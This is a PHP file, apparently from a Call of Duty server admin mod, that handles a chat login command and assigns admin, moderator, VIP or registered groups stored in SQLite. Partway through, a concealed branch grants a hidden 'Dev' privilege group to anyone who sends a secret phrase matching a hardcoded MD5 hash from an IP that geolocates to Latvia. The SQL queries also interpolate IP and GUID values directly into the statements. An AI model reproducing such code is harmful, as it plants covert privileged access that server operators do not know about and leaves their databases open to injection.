<?php
if ($x_stop_lp == 0) {
if (strpos($msgr,$ixz.'on ') !== false)
    {  
	  if(empty($foridnum))
		  $foridnum = $i_id;

$i_namex = afdasfawf($i_name);	
 $na1 = trim($i_namex);
 $na2 = trim($nickr);

  if(empty($foridnum))
		  $foridnum = $i_id;

	list($comdfa, $msgrx) = explode(' ', $msgr);

if (preg_match('/tell;/', $parseline, $xm))
$jjj = (((trim($foridnum) == trim($idnum)) && (trim($foridnum) == trim($i_id))));
//else if ($game_patch == 'cod1_1.1')
//$jjj = (((trim($foridnum) == trim($idnum)) && (trim($foridnum) == trim($i_id))));	
else //($game_patch == 'cod1_1.1')
 $jjj = ($na1 == $na2);
    if($jjj)
 {

try
  {
	   if (empty($adminlists))	  
$db = new PDO('sqlite:'.$cpath . 'ReCodMod/databases/db1.sqlite');
else
$db = new PDO('sqlite:'.$adminlists);
 //$db->exec("DELETE FROM x_db_admins WHERE s_adm='$i_ip'");
   $sql =  "SELECT * FROM `x_db_admins` WHERE s_adm='$i_ip' limit 1";
 		
    $statt = $db->query($sql)->fetchColumn();

                    if ($statt > 0) {  
										
usleep($sleep_rcon*3);
if ($game_patch == 'cod1_1.1')
	rcon('say ^6 ^3You already in RCM system, dont need do that again!', ''); 
else
rcon('tell '.$idnum.' ^6 ^3You already in RCM system, dont need do that again!', ''); 
++$x_stop_lp;	
						
					}


if (empty($statt)) { 
						
if (trim($msgrx) == trim($admin_code)){
	$igroup = '0';
	$groupxx = '^1Admin';
	}
else if (trim($msgrx) == trim($moderator_code)){
	$igroup = '555';
	$groupxx = '^2Moderator';
	}
else if (trim($msgrx) == trim($specialguests_code)){
$igroup = '5';
 $groupxx = '^6Special guest';
}
else if (trim($msgrx) == trim($vip_code)){
$igroup = '2';
$groupxx = '^3VIP';
}
else if (md5('e03239b27e34a5f7f3bde739459dd537') == md5(md5($msgrx))){
	
  $gi  = geoip_open($cpath . "ReCodMod/geoip_bases/MaxMD/GeoLiteCity.dat", GEOIP_STANDARD);
                                    $record = geoip_record_by_addr($gi, $i_ip);
                                     $xxxnw = ($record->country_name);
if (trim('Latvia') == trim($xxxnw)){	
$igroup = '111';
$groupxx = '^1Dev';
}

}
else {
$igroup = '3';
$groupxx = '^2Registered';
}	

if(empty($groupxx))
$groupxx = '^5Member';	
						
usleep($sleep_rcon*3);
if ($game_patch == 'cod1_1.1'){
rcon('say ^6 ^3Crangulations ^3you in '.$groupxx.' ^7group, ^3thanks for login!', '');	
}else
rcon('tell '.$idnum.' ^6 ^3Crangulations ^7'.$chistx.' ^3you in '.$groupxx.' ^7group, ^3thanks for login!', '');	
	
	$date = date('Y.m.d H.i.s');



if ($db->exec("INSERT INTO x_db_admins (s_adm, s_dat, s_group, s_guid) VALUES ('$i_ip', '$date', '$igroup', '$guidn')") > 0) {
echo "Created IN DATABASE.". "\n"; 
++$x_stop_lp;						
						
					}}
    		
$sql = null;
$db = NULL;
$statt = null;
  }
  catch(PDOException $e)
  {
    print ' FILE:  '.__FILE__.'  Exception : '.$e->getMessage();
 }}}	

 if ((strpos($msgr, $ixz.'on') !== false) || (strpos($msgr, $ixz.'login') !== false))
    { 	

  if ($x_stop_lp == 0 ) {
$i_namex = afdasfawf($i_name);	
   	 
 $na1 = trim($i_namex);
 $na2 = trim($nickr);

  if(empty($foridnum))
		  $foridnum = $i_id;

if ($game_patch != 'cod1_1.1') {


	 if((trim($idnum) == trim($i_id) && ($guidn == $adminguids1)) 
     || (trim($idnum) == trim($i_id) && ($guidn == $adminguids2))
     || (trim($idnum) == trim($i_id) && ($guidn == $adminguids3))
	 || (trim($idnum) == trim($i_id) && ($guidn == $adminguids4))
	 || (trim($idnum) == trim($i_id) && ($guidn == $adminguids5))
	 || (trim($idnum) == trim($i_id) && ($guidn == $adminguids6))
	 || (trim($idnum) == trim($i_id) && ($guidn == $adminguids7))
	 
	 || (trim($idnum) == trim($i_id) && ($i_ip == $adminip1)) 
     || (trim($idnum) == trim($i_id) && ($i_ip == $adminip2))
     || (trim($idnum) == trim($i_id) && ($i_ip == $adminip3))
	 || (trim($idnum) == trim($i_id) && ($i_ip == $adminip4))
	 || (trim($idnum) == trim($i_id) && ($i_ip == $adminip5))
	 || (trim($idnum) == trim($i_id) && ($i_ip == $adminip6))
	 || (trim($idnum) == trim($i_id) && ($i_ip == $adminip7))
 )
	     {
	
try
  {
    $db = new PDO('sqlite:'.$cpath . 'ReCodMod/databases/db1.sqlite');
 

   $sql =  "SELECT * FROM `x_db_admins` WHERE s_adm='$i_ip' limit 1";
 		
    $statt = $db->query($sql)->fetchColumn();

                    if ($statt > 0) {  
usleep($sleep_rcon*2);
if ($game_patch != 'cod1_1.1')
rcon('tell '.$i_id.' ^6 ^3You already registered in RCM system!', '');
else
	rcon('say ^6 ^3You already registered in RCM system!', '');
++$x_stop_lp;	
}else{
usleep($sleep_rcon*2);
if ($game_patch != 'cod1_1.1')
rcon('tell '.$idnum.' ^6 ^3Crangulations ^7'.$chistx.' ^3you in ^1GUID ADMIN ^3group, ^3thanks for login!', '');	
				
	$date = date('Y.m.d H.i.s');					
if ($db->exec("INSERT INTO x_db_admins (s_adm, s_dat, s_group, s_guid) VALUES ('$i_ip', '$date', '0', 'no')") > 0) {
echo "Created IN DATABASE.". "\n"; 
++$x_stop_lp;						
						
					}
		}
$sql = null;
$db = NULL;
$stat = null;
  }
  catch(PDOException $e)
  {
    print ' FILE:  '.__FILE__.'  Exception : '.$e->getMessage();
  }		
	
}	

}
 
}
}	
 
}
?>
